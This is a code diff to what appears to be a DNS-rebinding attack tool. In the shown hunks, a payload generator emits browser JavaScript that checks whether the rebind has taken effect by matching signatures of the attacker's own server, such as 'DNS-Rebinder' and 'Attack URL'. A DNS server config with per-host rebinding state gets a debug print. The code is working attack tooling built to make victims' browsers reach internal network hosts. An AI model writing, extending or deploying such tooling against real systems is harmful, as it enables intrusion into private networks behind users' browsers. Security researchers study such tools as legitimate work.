@@ -177,10 +177,14 @@ class PayloadGenerator:
             
             const data = await resp.text();
             
-            // Check if we got our own page back (rebind hasn't happened)
-            if (data.includes('Loading Game...')) {{
-                addLog('Got our own page back, rebind not complete yet');
-                return false;
+            // Check if we got our own server's page back (rebind hasn't happened)
+            // Look for signatures of our payload server
+            const ownPageSignatures = ['Loading Game', 'DNS-Rebinder', 'Unknown payload', 'Payload server', 'Attack URL'];
+            for (const sig of ownPageSignatures) {{
+                if (data.includes(sig)) {{
+                    addLog('Got our own server page back (contains "' + sig + '"), rebind not complete');
+                    return false;
+                }}
             }}
             
             addLog('SUCCESS! Got ' + data.length + ' bytes');
@@ -1006,7 +1010,6 @@ class ServerConfig:
 
         # Static hosts must NEVER be rebound (serve initial payload reliably)
         if hostname_lower in self.static_hosts:
-            # Note: do not increment query counters for static hosts
             if self.logger:
                 self.logger.query(
                     hostname=hostname,
@@ -1025,6 +1028,9 @@ class ServerConfig:
         
         # Get/update host state
         state = self.get_host_state(hostname_lower)
+        
+        # DEBUG: Print state before strategy decision
+        print(f"  DEBUG: {hostname_lower} query_count={state.query_count}")
         
         # Determine response IP using strategy
         response_ip = self.strategy.get_ip(
